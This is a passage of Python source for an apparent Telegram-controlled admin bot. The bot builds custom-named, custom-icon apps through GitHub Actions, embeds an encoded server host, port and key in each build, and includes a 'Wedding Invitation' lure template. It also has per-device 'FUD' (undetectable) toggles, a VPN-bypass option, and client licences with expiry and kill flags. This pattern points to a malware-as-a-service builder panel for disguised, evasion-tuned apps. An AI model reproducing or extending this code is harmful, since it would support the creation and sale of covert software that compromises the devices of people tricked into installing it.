            "🛡 Override FUD ON (this device)",
            callback_data=f"toggle_device_fud_{device_id}_1"))
        kb.add(types.InlineKeyboardButton(
            "🚫 Override FUD OFF (this device)",
            callback_data=f"toggle_device_fud_{device_id}_0"))
    elif dev_fud == 1:
        kb.add(types.InlineKeyboardButton(
            "🚫 Turn FUD OFF (this device)",
            callback_data=f"toggle_device_fud_{device_id}_0"))
        kb.add(types.InlineKeyboardButton(
            "↩️ Reset to Inherit",
            callback_data=f"toggle_device_fud_{device_id}_-1"))
    else:
        kb.add(types.InlineKeyboardButton(
            "🛡 Turn FUD ON (this device)",
            callback_data=f"toggle_device_fud_{device_id}_1"))
        kb.add(types.InlineKeyboardButton(
            "↩️ Reset to Inherit",
            callback_data=f"toggle_device_fud_{device_id}_-1"))
    kb.add(
        types.InlineKeyboardButton(
            "🔙 Back", callback_data=f"devices_{build_id}_1"),
        types.InlineKeyboardButton("🏠 Home", callback_data="nav_home"),
    )
    safe_edit(chat_id, message_id, text, kb)


def show_client_stats(chat_id, message_id, client_id):
    db = get_db()
    c  = db.execute(
        "SELECT * FROM clients WHERE id=?", (client_id,)).fetchone()
    db.close()
    if not c:
        safe_edit(chat_id, message_id, "❌ Client not found.", kb_home_only())
        return
    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.add(
        types.InlineKeyboardButton(
            "🔙 Back", callback_data=f"client_{client_id}"),
        types.InlineKeyboardButton("🏠 Home", callback_data="nav_home"),
    )
    safe_edit(chat_id, message_id, text_client_stats(dict(c)), kb)


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 10 — GITHUB BUILD TRIGGER
# ═══════════════════════════════════════════════════════════════════════════════

def trigger_github_build(template: str, client_id: int,
                         chat_id: str, message_id: str,
                         custom_app_name: str = "",
                         custom_icon_file_id: str = "",
                         server_host_b64: str = "",
                         server_port_b64: str = "",
                         server_key_b64: str = "",
                         client_name: str = "",
                         client_ip: str = "",
                         client_port: str = "",
                         app_name: str = "",
                         fud_status: str = "",
                         client_token: str = "manual") -> bool:
    url     = (
        f"https://api.github.com/repos/"
        f"{config.GITHUB_OWNER}/{config.GITHUB_REPO}"
        f"/actions/workflows/build.yml/dispatches"
    )
    headers = {
        "Authorization": f"token {config.GITHUB_TOKEN}",
        "Accept":        "application/vnd.github.v3+json",
        "Content-Type":  "application/json",
    }
    inputs = {
        "template":         template,
        "client_id":        str(client_id),
        "build_chat_id":    str(chat_id),
        "build_message_id": str(message_id),
        "client_name":      client_name,
        "client_ip":        client_ip,
        "client_port":      client_port,
        "app_name":         app_name,
        "fud_status":       fud_status,
        "client_token":     client_token or "manual",
    }
    if custom_app_name:
        inputs["custom_app_name"] = custom_app_name
    if custom_icon_file_id:
        inputs["custom_icon_file_id"] = custom_icon_file_id
    if server_host_b64:
        inputs["server_host_b64"] = server_host_b64
    if server_port_b64:
        inputs["server_port_b64"] = server_port_b64
    if server_key_b64:
        inputs["server_key_b64"] = server_key_b64
    payload = {
        "ref": "main",
        "inputs": inputs,
    }
    try:
        resp = requests.post(
            url, headers=headers, json=payload, timeout=15)
        if resp.status_code == 204:
            log.info(f"GitHub build triggered: template={template} "
                     f"client={client_id}")
            return True
        log.error(f"GitHub API error: {resp.status_code} {resp.text[:200]}")
        return False
    except Exception as e:
        log.error(f"GitHub trigger failed: {e}")
        return False


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 10b — PRODUCTION CONTROL — GITHUB API HELPERS
# ═══════════════════════════════════════════════════════════════════════════════

GH_API  = "https://api.github.com"
GH_REPO = lambda: f"{GH_API}/repos/{config.GITHUB_OWNER}/{config.GITHUB_REPO}"
GH_HDR  = lambda: {
    "Authorization": f"token {config.GITHUB_TOKEN}",
    "Accept":        "application/vnd.github.v3+json",
    "Content-Type":  "application/json",
}

# ── active build run tracking (for Cancel Build) ──────────────────────────────
prod_active_run: dict = {}         # str(chat_id) -> run_id (int)


def gh_get(path: str, timeout: int = 15) -> dict:
    """GET from GitHub API. Returns {} on error."""
    try:
        r = requests.get(f"{GH_REPO()}{path}", headers=GH_HDR(), timeout=timeout)
        if r.status_code == 200:
            return r.json()
        log.warning(f"gh_get {path} → {r.status_code}")
        return {}
    except Exception as e:
        log.error(f"gh_get error: {e}")
        return {}


def gh_post(path: str, payload: dict, timeout: int = 15) -> requests.Response | None:
    """POST to GitHub API. Returns response or None."""
    try:
        return requests.post(
            f"{GH_REPO()}{path}", headers=GH_HDR(), json=payload, timeout=timeout)
    except Exception as e:
        log.error(f"gh_post error: {e}")
        return None


def gh_patch(path: str, payload: dict, timeout: int = 15) -> requests.Response | None:
    """PATCH to GitHub API."""
    try:
        return requests.patch(
            f"{GH_REPO()}{path}", headers=GH_HDR(), json=payload, timeout=timeout)
    except Exception as e:
        log.error(f"gh_patch error: {e}")
        return None


def prod_get_latest_run_id(workflow: str, branch: str, max_wait: int = 12) -> int | None:
    """Poll GitHub for the most-recently-triggered run of *workflow* on *branch*.
    Returns the run_id once it appears, or None if it doesn't appear within
    max_wait seconds."""
    import time
    deadline = time.time() + max_wait
    seen: set[int] = set()
    # snapshot existing runs so we detect only the new one
    data = gh_get(f"/actions/workflows/{workflow}/runs?branch={branch}&per_page=5")
    for r in (data.get("workflow_runs") or []):
        seen.add(r["id"])
    while time.time() < deadline:
        time.sleep(2)
        data = gh_get(f"/actions/workflows/{workflow}/runs?branch={branch}&per_page=5")
        for r in (data.get("workflow_runs") or []):
            if r["id"] not in seen:
                return r["id"]
    return None


# SECTION 11 — BOT HANDLERS
# ═══════════════════════════════════════════════════════════════════════════════

@bot.message_handler(commands=["start"])
def handle_start(message):
    if not is_admin(message.chat.id):
        return
    chat_id = str(message.chat.id)
    # Delete previous bot message if exists
    old = nav_state.get(chat_id, {}).get("message_id")
    if old:
        try:
            bot.delete_message(message.chat.id, old)
        except Exception:
            pass
    # Delete the /start command message
    try:
        bot.delete_message(message.chat.id, message.message_id)
    except Exception:
        pass
    # Auto-clean stale notification messages (RDP Auto-Synced, Bot Self-Restarting)
    while _pending_delete_msg_ids:
        _mid = _pending_delete_msg_ids.pop(0)
        try:
            bot.delete_message(message.chat.id, _mid)
        except Exception:
            pass
    # If session is still valid (loaded from file at startup), skip PIN
    if session_valid(message.chat.id):
        msg = bot.send_message(
            message.chat.id,
            text_main(message.chat.id),
            reply_markup=kb_main(),
            parse_mode="HTML",
        )
        nav_state[chat_id] = {
            "screen":     "main",
            "message_id": msg.message_id,
        }
        return
    pin_buffer[chat_id] = ""
    msg = bot.send_message(
        message.chat.id,
        text_pin(),
        parse_mode="HTML",
    )
    nav_state[chat_id] = {
        "screen":     "pin",
        "message_id": msg.message_id,
    }


@bot.message_handler(
    func=lambda m: nav_state.get(
        str(m.chat.id), {}).get("screen") == "pin")
def handle_pin_text(message):
    chat_id = str(message.chat.id)
    if not is_admin(message.chat.id):
        return
    msg_id = nav_state.get(chat_id, {}).get("message_id")
    # Always delete the user's PIN message immediately (security)
    try:
        bot.delete_message(message.chat.id, message.message_id)
    except Exception:
        pass
    # Layer 3: Check lockout
    locked, mins = is_locked_out(message.chat.id)
    if locked:
        cid = str(message.chat.id)
        kb_unlock = types.InlineKeyboardMarkup()
        if cid not in _unlock_blocked:
            kb_unlock.add(types.InlineKeyboardButton(
                "🔓 Unlock", callback_data="do_unlock"))
        safe_edit(
            message.chat.id, msg_id,
            f"🔒 <b>Too many failed attempts.</b>\n"
            f"Locked for {mins} more minute(s).",
            kb_unlock,
        )
        return
    entered = message.text.strip() if message.text else ""
    if entered == str(config.ADMIN_PIN):
        pin_buffer[chat_id] = ""
        clear_fails(message.chat.id)
        nav_state[chat_id] = {"screen": "2fa", "message_id": msg_id}
        safe_edit(message.chat.id, msg_id, text_2fa())
    else:
        count = record_pin_fail(message.chat.id)
        locked2, mins2 = is_locked_out(message.chat.id)
        if locked2:
            cid2 = str(message.chat.id)
            kb_unlock2 = types.InlineKeyboardMarkup()
            if cid2 not in _unlock_blocked:
                kb_unlock2.add(types.InlineKeyboardButton(
                    "🔓 Unlock", callback_data="do_unlock"))
            safe_edit(
                message.chat.id, msg_id,
                f"🔒 <b>Too many failed attempts.</b>\n"
                f"Locked for {mins2} minutes.",
                kb_unlock2,
            )
        else:
            remaining = MAX_PIN_FAILS - count
            safe_edit(
                message.chat.id, msg_id,
                f"❌ <b>Wrong PIN.</b> {remaining} attempt(s) left.\n\n"
                + text_pin(),
            )


@bot.message_handler(
    func=lambda m: nav_state.get(
        str(m.chat.id), {}).get("screen") == "2fa")
def handle_2fa(message):
    chat_id = str(message.chat.id)
    if not is_admin(message.chat.id):
        return
    code   = message.text.strip()
    msg_id = nav_state.get(chat_id, {}).get("message_id")
    try:
        bot.delete_message(message.chat.id, message.message_id)
    except Exception:
        pass
    # Layer 3: Check lockout
    locked, mins = is_locked_out(message.chat.id)
    if locked:
        kb_unlock_2fa = types.InlineKeyboardMarkup()
        if chat_id not in _unlock_blocked:
            kb_unlock_2fa.add(types.InlineKeyboardButton(
                "🔓 Unlock", callback_data="do_unlock"))
        safe_edit(
            message.chat.id, msg_id,
            f"🔒 <b>Too many failed attempts.</b>\n"
            f"Locked for {mins} more minute(s).",
            kb_unlock_2fa,
        )
        return

    if verify_totp(code):
        clear_fails(message.chat.id)
        create_session(message.chat.id)
        nav_state[chat_id] = {
            "screen": "main", "message_id": msg_id}
        safe_edit(message.chat.id, msg_id,
                  text_main(message.chat.id), kb_main())
    else:
        count     = record_totp_fail(message.chat.id)
        locked2, mins2 = is_locked_out(message.chat.id)
        if locked2:
            kb_unlock_2fa2 = types.InlineKeyboardMarkup()
            if chat_id not in _unlock_blocked:
                kb_unlock_2fa2.add(types.InlineKeyboardButton(
                    "🔓 Unlock", callback_data="do_unlock"))
            safe_edit(
                message.chat.id, msg_id,
                f"🔒 <b>Too many failed attempts.</b>\n"
                f"Locked for {mins2} minutes.",
                kb_unlock_2fa2,
            )
        else:
            remaining = MAX_TOTP_FAILS - count
            safe_edit(
                message.chat.id, msg_id,
                f"❌ Wrong 2FA code. "
                f"{remaining} attempt(s) left.\n\n"
                + text_2fa()
            )


# ── Emergency unlock: master password input ───────────────────────────────────
@bot.message_handler(
    func=lambda m: nav_state.get(
        str(m.chat.id), {}).get("screen") == "awaiting_unlock")
def handle_unlock_password(message):
    chat_id = str(message.chat.id)
    if not is_admin(message.chat.id):
        return
    msg_id = nav_state.get(chat_id, {}).get("message_id")
    # Always delete the user's message immediately (security — hide password)
    try:
        bot.delete_message(message.chat.id, message.message_id)
    except Exception:
        pass
    # Silently ignore if permanently blocked
    if chat_id in _unlock_blocked:
        return
    entered = message.text.strip() if message.text else ""
    master_pw = getattr(config, "MASTER_UNLOCK_PASSWORD", "")
    if entered == master_pw and master_pw:
        # ✅ Correct — clear lockout, reset unlock counter, show PIN prompt
        clear_fails(message.chat.id)
        _unlock_attempts.pop(chat_id, None)
        pin_buffer[chat_id] = ""
        nav_state[chat_id] = {"screen": "pin", "message_id": msg_id}
        safe_edit(
            message.chat.id, msg_id,
            "✅ <b>Unlocked.</b> Enter your PIN to continue.\n\n"
            + text_pin(""),
            kb_pin(),
        )
    else:
        # ❌ Wrong — track attempts
        count = _unlock_attempts.get(chat_id, 0) + 1
        _unlock_attempts[chat_id] = count
        if count >= MAX_UNLOCK_FAILS:
            _unlock_blocked.add(chat_id)
            nav_state.pop(chat_id, None)
            safe_edit(
                message.chat.id, msg_id,
                "🚫 <b>Too many wrong master passwords.</b>\n"
                "Further unlock attempts are blocked until bot restart."
            )
        else:
            remaining = MAX_UNLOCK_FAILS - count
            kb_retry = types.InlineKeyboardMarkup()
            kb_retry.add(types.InlineKeyboardButton(
                "🔓 Try Again", callback_data="do_unlock"))
            safe_edit(
                message.chat.id, msg_id,
                f"❌ <b>Wrong master password.</b> {remaining} attempt(s) left.",
                kb_retry,
            )


# ── Custom build flow: text input (app name) ────────────────────────────────
@bot.message_handler(
    func=lambda m: (
        custom_build_buf.get(str(m.chat.id), {}).get("step") == "name"
        and m.text is not None
    ))
def handle_custom_build_name(message):
    chat_id = str(message.chat.id)
    if not is_admin(message.chat.id) or not session_valid(message.chat.id):
        return
    buf    = custom_build_buf.get(chat_id)
    msg_id = nav_state.get(chat_id, {}).get("message_id")
    try:
        bot.delete_message(message.chat.id, message.message_id)
    except Exception:
        pass
    app_name = message.text.strip()
    if not app_name:
        safe_edit(message.chat.id, msg_id,
                  text_custom_name_prompt(buf["client_id"]),
                  kb_custom_cancel(buf["client_id"]))
        return
    buf["app_name"] = app_name
    buf["step"]     = "icon"
    custom_build_buf[chat_id] = buf
    safe_edit(message.chat.id, msg_id,
              text_custom_icon_prompt(app_name),
              kb_custom_cancel(buf["client_id"]))


# ── Custom build flow: photo/document input (icon PNG) ───────────────────────
@bot.message_handler(
    content_types=["photo", "document"],
    func=lambda m: (
        custom_build_buf.get(str(m.chat.id), {}).get("step") == "icon"
    ))
def handle_custom_build_icon(message):
    import io, os, tempfile
    from PIL import Image

    chat_id = str(message.chat.id)
    if not is_admin(message.chat.id) or not session_valid(message.chat.id):
        return
    buf    = custom_build_buf.get(chat_id)
    msg_id = nav_state.get(chat_id, {}).get("message_id")
    try:
        bot.delete_message(message.chat.id, message.message_id)
    except Exception:
        pass

    # ── 1. Extract raw file_id from photo or document ────────────────────────
    if message.photo:
        # Sent as compressed photo — highest resolution last
        file_id = message.photo[-1].file_id
    elif message.document:
        mime = message.document.mime_type or ""
        if not mime.startswith("image/"):
            safe_edit(message.chat.id, msg_id,
                      text_custom_icon_prompt(buf["app_name"])
                      + "\n\n⚠️ <b>Not an image file.</b>\nSend any image (JPG, PNG, WEBP…).",
                      kb_custom_cancel(buf["client_id"]))
            return
        file_id = message.document.file_id
    else:
        return

    # ── 2. Download image from Telegram ──────────────────────────────────────
    try:
        file_info   = bot.get_file(file_id)
        file_bytes  = bot.download_file(file_info.file_path)
    except Exception as e:
        safe_edit(message.chat.id, msg_id,
                  text_custom_icon_prompt(buf["app_name"])
                  + f"\n\n⚠️ <b>Download failed:</b> {e}\nPlease try again.",
                  kb_custom_cancel(buf["client_id"]))
        return

    # ── 3. Convert to professional 512×512 PNG using Pillow ──────────────────
    try:
        img = Image.open(io.BytesIO(file_bytes))

        # Normalise color mode — handle palette, RGBA, greyscale, etc.
        if img.mode == "RGBA":
            # Composite onto white background so JPG export is clean
            background = Image.new("RGB", img.size, (255, 255, 255))
            background.paste(img, mask=img.split()[3])
            img = background
        elif img.mode != "RGB":
            img = img.convert("RGB")

        # Center-crop to square then resize to 512×512
        w, h   = img.size
        side   = min(w, h)
        left   = (w - side) // 2
        top    = (h - side) // 2
        img    = img.crop((left, top, left + side, top + side))
        img    = img.resize((512, 512), Image.LANCZOS)

        # Save as PNG into a temp file
        tmp_fd, tmp_path = tempfile.mkstemp(suffix=".png")
        os.close(tmp_fd)
        img.save(tmp_path, format="PNG", optimize=True)

    except Exception as e:
        safe_edit(message.chat.id, msg_id,
                  text_custom_icon_prompt(buf["app_name"])
                  + f"\n\n⚠️ <b>Image conversion failed:</b> {e}\nPlease try again.",
                  kb_custom_cancel(buf["client_id"]))
        return

    # ── 4. Re-upload converted PNG to Telegram to get a stable file_id ───────
    try:
        with open(tmp_path, "rb") as f:
            sent = bot.send_document(
                message.chat.id,
                f,
                visible_file_name="app_icon.png",
                caption="✅ Icon converted to 512×512 PNG",
            )
        new_file_id = sent.document.file_id
        # Delete the confirmation message so it doesn't clutter the chat
        try:
            bot.delete_message(message.chat.id, sent.message_id)
        except Exception:
            pass
    except Exception as e:
        safe_edit(message.chat.id, msg_id,
                  text_custom_icon_prompt(buf["app_name"])
                  + f"\n\n⚠️ <b>Upload failed:</b> {e}\nPlease try again.",
                  kb_custom_cancel(buf["client_id"]))
        return
    finally:
        try:
            os.remove(tmp_path)
        except Exception:
            pass

    # ── 5. Store new PNG file_id and proceed to server config ─────────────────
    buf["icon_file_id"] = new_file_id
    buf["step"]         = "done"
    custom_build_buf[chat_id] = buf
    server_config_buf[chat_id] = {
        "step": "host_type",
        "host_type": None,
        "client_id": buf["client_id"],
        "template": "custom",
        "ip": None,
        "port": None,
        "key": None,
    }
    nav_state[chat_id] = {
        "screen": "server_config",
        "message_id": msg_id,
    }
    _cfg = read_companion_server_config()
    server_config_buf[chat_id]["_companion_cfg"] = _cfg
    safe_edit(message.chat.id, msg_id,
              text_server_host_type_prompt(buf["client_id"], "custom", cfg=_cfg),
              kb_server_host_type(buf["client_id"], "custom"))


# ── Custom build flow: reject non-photo during icon step ─────────────────────
@bot.message_handler(
    func=lambda m: (
        custom_build_buf.get(str(m.chat.id), {}).get("step") == "icon"
        and m.text is not None
    ))
def handle_custom_build_icon_reject(message):
    chat_id = str(message.chat.id)
    if not is_admin(message.chat.id) or not session_valid(message.chat.id):
        return
    buf    = custom_build_buf.get(chat_id)
    msg_id = nav_state.get(chat_id, {}).get("message_id")
    try:
        bot.delete_message(message.chat.id, message.message_id)
    except Exception:
        pass
    safe_edit(message.chat.id, msg_id,
              text_custom_icon_prompt(buf["app_name"])
              + "\n\n⚠️ <b>Please send an image file, not text.</b>",
              kb_custom_cancel(buf["client_id"]))


# ── Server config flow: text input (IP → Port → Key) ──────────────────────
@bot.message_handler(
    func=lambda m: (
        server_config_buf.get(str(m.chat.id), {}).get("step") == "ip"
        and m.text is not None
    ))
def handle_server_config_ip(message):
    chat_id = str(message.chat.id)
    if not is_admin(message.chat.id) or not session_valid(message.chat.id):
        return
    buf    = server_config_buf.get(chat_id)
    msg_id = nav_state.get(chat_id, {}).get("message_id")
    try:
        bot.delete_message(message.chat.id, message.message_id)
    except Exception:
        pass
    ip = message.text.strip()
    if not ip:
        safe_edit(message.chat.id, msg_id,
                  text_server_ip_prompt(buf["client_id"], buf["template"]),
                  kb_server_config_cancel(buf["client_id"], buf["template"]))
        return
    # Cache companion config once here — reused by port/key prompts and confirm
    if "_companion_cfg" not in buf:
        buf["_companion_cfg"] = read_companion_server_config()
    _cfg = buf["_companion_cfg"]
    buf["ip"]   = ip
    buf["step"] = "port"
    server_config_buf[chat_id] = buf
    safe_edit(message.chat.id, msg_id,
              text_server_port_prompt(ip, cfg=_cfg),
              kb_server_config_port(buf["client_id"], buf["template"], _cfg.get("port", "") if _cfg else ""))


# ── Server config flow: Domain text input ─────────────────────────────────────
@bot.message_handler(
    func=lambda m: (
        server_config_buf.get(str(m.chat.id), {}).get("step") == "domain"
        and m.text is not None
    ))
def handle_server_config_domain(message):
    chat_id = str(message.chat.id)
    if not is_admin(message.chat.id) or not session_valid(message.chat.id):
        return
    buf    = server_config_buf.get(chat_id)
    msg_id = nav_state.get(chat_id, {}).get("message_id")
    try:
        bot.delete_message(message.chat.id, message.message_id)
    except Exception:
        pass
    domain = message.text.strip()
    if not domain or not is_domain(domain):
        safe_edit(message.chat.id, msg_id,
                  text_server_domain_prompt(cfg=buf.get("_companion_cfg"))
                  + "\n\n⚠️ <b>Invalid domain. Use format: monster.servemp3.com</b>",
                  kb_server_domain(buf["client_id"], buf["template"]))
        return
    if "_companion_cfg" not in buf:
        buf["_companion_cfg"] = read_companion_server_config()
    _cfg = buf["_companion_cfg"]
    # Store raw domain — confirm_build_ will Base64-encode it (line: b64encode(sbuf["ip"]))
    buf["ip"]   = domain
    buf["step"] = "port"
    server_config_buf[chat_id] = buf
    safe_edit(message.chat.id, msg_id,
              text_server_port_prompt(domain, cfg=_cfg),
              kb_server_config_port(buf["client_id"], buf["template"], _cfg.get("port", "") if _cfg else ""))


@bot.message_handler(
    func=lambda m: (
        server_config_buf.get(str(m.chat.id), {}).get("step") == "port"
        and m.text is not None
    ))
def handle_server_config_port(message):
    chat_id = str(message.chat.id)
    if not is_admin(message.chat.id) or not session_valid(message.chat.id):
        return
    buf    = server_config_buf.get(chat_id)
    msg_id = nav_state.get(chat_id, {}).get("message_id")
    try:
        bot.delete_message(message.chat.id, message.message_id)
    except Exception:
        pass
    _cfg = buf.get("_companion_cfg")  # cached from IP step
    port = message.text.strip()
    if not port:
        safe_edit(message.chat.id, msg_id,
                  text_server_port_prompt(buf["ip"], cfg=_cfg),
                  kb_server_config_port(buf["client_id"], buf["template"], _cfg.get("port", "") if _cfg else ""))
        return
    buf["port"] = port
    buf["step"] = "key"
    server_config_buf[chat_id] = buf
    safe_edit(message.chat.id, msg_id,
              text_server_key_prompt(buf["ip"], port, cfg=_cfg),
              kb_server_config_key(buf["client_id"], buf["template"], _cfg.get("key", "") if _cfg else ""))


@bot.message_handler(
    func=lambda m: (
        server_config_buf.get(str(m.chat.id), {}).get("step") == "key"
        and m.text is not None
    ))
def handle_server_config_key(message):
    chat_id = str(message.chat.id)
    if not is_admin(message.chat.id) or not session_valid(message.chat.id):
        return
    buf    = server_config_buf.get(chat_id)
    msg_id = nav_state.get(chat_id, {}).get("message_id")
    try:
        bot.delete_message(message.chat.id, message.message_id)
    except Exception:
        pass
    _cfg = buf.get("_companion_cfg")  # cached from IP step; fallback below
    key = message.text.strip()
    if not key:
        safe_edit(message.chat.id, msg_id,
                  text_server_key_prompt(buf["ip"], buf["port"], cfg=_cfg),
                  kb_server_config_key(buf["client_id"], buf["template"], _cfg.get("key", "") if _cfg else ""))
        return
    buf["key"]  = key
    buf["step"] = "done"
    server_config_buf[chat_id] = buf
    # Use cached companion values for before→after diff (avoid re-reading APK)
    if _cfg is None:
        _cfg = read_companion_server_config()
    _old_ip   = _cfg["ip"]   or "—"
    _old_port = _cfg["port"] or "—"
    _old_key  = _cfg["key"]  or "—"
    _new_ip   = buf["ip"]
    _new_port = buf["port"]
    _new_key  = buf["key"]

    def _diff(old, new):
        # Fix 1: use <del> (Telegram HTML), not <s> (unsupported)
        # Fix 2: show (unchanged) label instead of bare code when same
        if old == new:
            return f"<code>{new}</code> (unchanged)"
        return f"<del>{old}</del> → <code>{new}</code>"

    # Fix 3: diff block is BEFORE build summary — assembled here, prepended below
    _host_label = "🌐 Host" if is_domain(_new_ip) else "📡 IP  "
    _diff_block = (
        "🔄 <b>Config Update:</b>\n"
        f"   {_host_label} : {_diff(_old_ip,   _new_ip)}\n"
        f"   🔌 Port   : {_diff(_old_port, _new_port)}\n"
        f"   🔑 Key    : {_diff(_old_key,  _new_key)}\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
    )

    # Show confirmation screen
    template   = buf["template"]
    client_id  = buf["client_id"]
    is_rebuild = buf.get("is_rebuild", False)
    cbuf       = custom_build_buf.get(chat_id)
    if template == "custom" and cbuf:
        # Fix 3: diff block before build summary
        # Fix 4: text_custom_build_confirm already ends with "Everything correct?"
        #         — do NOT append it again
        # Fix 5: no extra ━ separator between diff block and build summary
        safe_edit(message.chat.id, msg_id,
                  _diff_block
                  + text_custom_build_confirm(
                      client_id, cbuf["app_name"],
                      srv_ip=_new_ip, srv_port=_new_port,
                      srv_key=_new_key),
                  kb_build_confirm(client_id, template))
    elif is_rebuild:
        safe_edit(message.chat.id, msg_id,
                  f"🔁 <b>Rebuild — confirm config</b>\n"
                  "━━━━━━━━━━━━━━━━━━━━\n"
                  + _diff_block +
                  "Confirm to rebuild with this config:",
                  kb_rebuild_confirm(client_id, template))
    else:
        # Fix 3: diff block before build summary
        # Fix 4: text_build_confirm already ends with "Everything correct?" — no duplicate
        # Fix 5: no extra ━ separator
        safe_edit(message.chat.id, msg_id,
                  _diff_block
                  + text_build_confirm(
                      client_id, template,
                      srv_ip=_new_ip, srv_port=_new_port,
                      srv_key=_new_key),
                  kb_build_confirm(client_id, template))


# ── Dev Test Build server config: IP → Port → Key ────────────────────────────
@bot.message_handler(
    func=lambda m: (
        dev_test_config_buf.get(str(m.chat.id), {}).get("step") == "ip"
        and m.text is not None
    ))
def handle_dev_test_config_ip(message):
    chat_id = str(message.chat.id)
    if not is_admin(message.chat.id) or not session_valid(message.chat.id):
        return
    buf    = dev_test_config_buf.get(chat_id)
    msg_id = nav_state.get(chat_id, {}).get("message_id")
    try:
        bot.delete_message(message.chat.id, message.message_id)
    except Exception:
        pass
    ip = message.text.strip()
    _cfg = buf.get("_cfg")
    if not ip:
        safe_edit(message.chat.id, msg_id,
                  text_dev_test_ip_prompt(_cfg),
                  kb_dev_test_config_ip(_cfg.get("ip", "") if _cfg else ""))
        return
    buf["ip"]   = ip
    buf["step"] = "port"
    dev_test_config_buf[chat_id] = buf
    safe_edit(message.chat.id, msg_id,
              text_dev_test_port_prompt(ip, _cfg),
              kb_dev_test_config_port(_cfg.get("port", "") if _cfg else ""))


@bot.message_handler(
    func=lambda m: (
        dev_test_config_buf.get(str(m.chat.id), {}).get("step") == "port"
        and m.text is not None
    ))
def handle_dev_test_config_port(message):
    chat_id = str(message.chat.id)
    if not is_admin(message.chat.id) or not session_valid(message.chat.id):
        return
    buf    = dev_test_config_buf.get(chat_id)
    msg_id = nav_state.get(chat_id, {}).get("message_id")
    try:
        bot.delete_message(message.chat.id, message.message_id)
    except Exception:
        pass
    _cfg = buf.get("_cfg")
    port = message.text.strip()
    if not port:
        safe_edit(message.chat.id, msg_id,
                  text_dev_test_port_prompt(buf.get("ip") or "", _cfg),
                  kb_dev_test_config_port(_cfg.get("port", "") if _cfg else ""))
        return
    buf["port"] = port
    buf["step"] = "key"
    dev_test_config_buf[chat_id] = buf
    safe_edit(message.chat.id, msg_id,
              text_dev_test_key_prompt(buf.get("ip") or "", port, _cfg),
              kb_dev_test_config_key(_cfg.get("key", "") if _cfg else ""))


@bot.message_handler(
    func=lambda m: (
        dev_test_config_buf.get(str(m.chat.id), {}).get("step") == "key"
        and m.text is not None
    ))
def handle_dev_test_config_key(message):
    chat_id = str(message.chat.id)
    if not is_admin(message.chat.id) or not session_valid(message.chat.id):
        return
    buf    = dev_test_config_buf.get(chat_id)
    msg_id = nav_state.get(chat_id, {}).get("message_id")
    try:
        bot.delete_message(message.chat.id, message.message_id)
    except Exception:
        pass
    _cfg = buf.get("_cfg")
    key = message.text.strip()
    if not key:
        safe_edit(message.chat.id, msg_id,
                  text_dev_test_key_prompt(buf.get("ip") or "", buf.get("port") or "", _cfg),
                  kb_dev_test_config_key(_cfg.get("key", "") if _cfg else ""))
        return
    buf["key"]  = key
    buf["step"] = "done"
    dev_test_config_buf[chat_id] = buf
    # Build diff block
    _old_ip   = _cfg["ip"]   if _cfg else "—"
    _old_port = _cfg["port"] if _cfg else "—"
    _old_key  = _cfg["key"]  if _cfg else "—"

    def _diff(old, new):
        if old == new:
            return f"<code>{new}</code> (unchanged)"
        return f"<del>{old}</del> → <code>{new}</code>"

    _diff_block = (
        "🔄 <b>Config Update:</b>\n"
        f"   📡 IP   : {_diff(_old_ip,   buf['ip'])}\n"
        f"   🔌 Port : {_diff(_old_port, buf['port'])}\n"
        f"   🔑 Key  : {_diff(_old_key,  buf['key'])}\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
    )
    safe_edit(message.chat.id, msg_id,
              _diff_block +
              "🧪 <b>Dev Test Build — 💍 Wedding Invitation</b>\n"
              "━━━━━━━━━━━━━━━━━━━━\n"
              "⚠️ No client delivery — admin only.\n\n"
              "Everything correct?",
              kb_dev_test_confirm())


@bot.message_handler(
    func=lambda m: nav_state.get(str(m.chat.id), {}).get("screen") == "set_expire"
                   and m.text is not None)
def handle_set_expire_input(message):
    """Operator typed a date string for set_expire flow."""
    chat_id = str(message.chat.id)
    if not is_admin(message.chat.id) or not session_valid(message.chat.id):
        return
    state     = nav_state.get(chat_id, {})
    client_id = state.get("client_id")
    msg_id    = state.get("message_id")
    try:
        bot.delete_message(message.chat.id, message.message_id)
    except Exception:
        pass
    text = (message.text or "").strip()

    if text == "0":
        # Remove expiry — no time limit
        db = get_db()
        db.execute("UPDATE clients SET expire_ts=0, killed=0 WHERE id=?", (client_id,))
        db.commit()
        c = db.execute("SELECT * FROM clients WHERE id=?", (client_id,)).fetchone()
        db.close()
        nav_state.pop(chat_id, None)
        safe_edit(message.chat.id, msg_id,
                  "✅ <b>Expiry removed</b> — no time limit.\n"
                  "━━━━━━━━━━━━━━━━━━━━\n"
                  + text_client_detail(dict(c)),
                  kb_client_detail(client_id,
                                   active=bool(c["active"]),
                                   vpn_bypass=int(c["vpn_bypass"] if "vpn_bypass" in c.keys() else 1),
                                   killed=0, expire_ts=0))
        return

    # Parse DD/MM/YYYY or DD-MM-YYYY
    import re as _re
    m = _re.match(r"(\d{1,2})[/\-](\d{1,2})[/\-](\d{4})", text)
    if not m:
        safe_edit(message.chat.id, msg_id,
                  "❌ Invalid date format.\n"
                  "Use <code>DD/MM/YYYY</code> — e.g. <code>31/12/2026</code>",
                  types.InlineKeyboardMarkup().add(
                      types.InlineKeyboardButton("🔙 Cancel", callback_data=f"client_{client_id}")))
        return

    day, month, year = int(m.group(1)), int(m.group(2)), int(m.group(3))
    try:
        from datetime import datetime as _dt
        new_expire = int(_dt(year, month, day, 23, 59, 59,
                             tzinfo=timezone.utc).timestamp())
    except ValueError:
        safe_edit(message.chat.id, msg_id,
                  "❌ Invalid date — check day/month values.",
                  types.InlineKeyboardMarkup().add(
                      types.InlineKeyboardButton("🔙 Cancel", callback_data=f"client_{client_id}")))
        return

    db = get_db()
    db.execute("UPDATE clients SET expire_ts=?, killed=0 WHERE id=?", (new_expire, client_id))
    db.commit()
    c = db.execute("SELECT * FROM clients WHERE id=?", (client_id,)).fetchone()
    db.close()
    nav_state.pop(chat_id, None)
    exp_str = datetime.fromtimestamp(new_expire, tz=timezone.utc).strftime("%d %b %Y")
    safe_edit(message.chat.id, msg_id,
              f"✅ <b>Expiry set: {exp_str}</b>\n"
              "━━━━━━━━━━━━━━━━━━━━\n"
              + text_client_detail(dict(c)),
              kb_client_detail(client_id,
                               active=bool(c["active"]),
                               vpn_bypass=int(c["vpn_bypass"] if "vpn_bypass" in c.keys() else 1),
                               killed=0, expire_ts=new_expire))


